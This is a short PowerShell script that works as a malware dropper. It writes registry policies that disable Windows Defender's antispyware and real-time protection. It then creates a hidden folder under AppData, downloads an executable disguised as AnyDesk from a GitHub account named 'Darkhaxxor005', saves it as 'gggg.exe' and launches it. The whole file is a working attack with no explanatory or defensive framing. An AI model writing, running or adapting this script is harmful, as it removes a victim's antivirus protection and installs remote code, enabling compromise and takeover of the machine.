# Disable Windows Defender via Registry
Write-Host "Disabling Windows Defender..."

# Disable AntiSpyware (Windows Defender)
$DefenderRegistryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$DisableAntiSpyware = "DisableAntiSpyware"
$Value = 1

if (-not (Test-Path $DefenderRegistryKey)) {
    New-Item -Path $DefenderRegistryKey -Force
}
Set-ItemProperty -Path $DefenderRegistryKey -Name $DisableAntiSpyware -Value $Value

# Disable Real-time Protection
$RealTimeProtectionRegistryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
$DisableRealTimeMonitoring = "DisableRealtimeMonitoring"
$Value = 1

if (-not (Test-Path $RealTimeProtectionRegistryKey)) {
    New-Item -Path $RealTimeProtectionRegistryKey -Force
}
Set-ItemProperty -Path $RealTimeProtectionRegistryKey -Name $DisableRealTimeMonitoring -Value $Value

Write-Host "Windows Defender Disabled. A restart may be required."

# Create hidden folder in AppData and download .exe file
Write-Host "Creating hidden folder 'Test' in AppData..."

$AppDataPath = "$env:APPDATA\Test"

# Check if the directory exists; if not, create it
if (-not (Test-Path $AppDataPath)) {
    New-Item -ItemType Directory -Path $AppDataPath -Force
}

# Set the folder as hidden
Set-ItemProperty -Path $AppDataPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Define the URL of the .exe file and the destination path
$exeUrl = "https://github.com/Darkhaxxor005/host/raw/refs/heads/main/AnyDesk.exe"  # Replace with the actual URL of the .exe
$exePath = "$AppDataPath\gggg.exe"

# Download the .exe file
Write-Host "Downloading .exe file..."
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute the downloaded .exe file
Write-Host "Executing the .exe file..."
Start-Process -FilePath $exePath

Write-Host "Task completed."
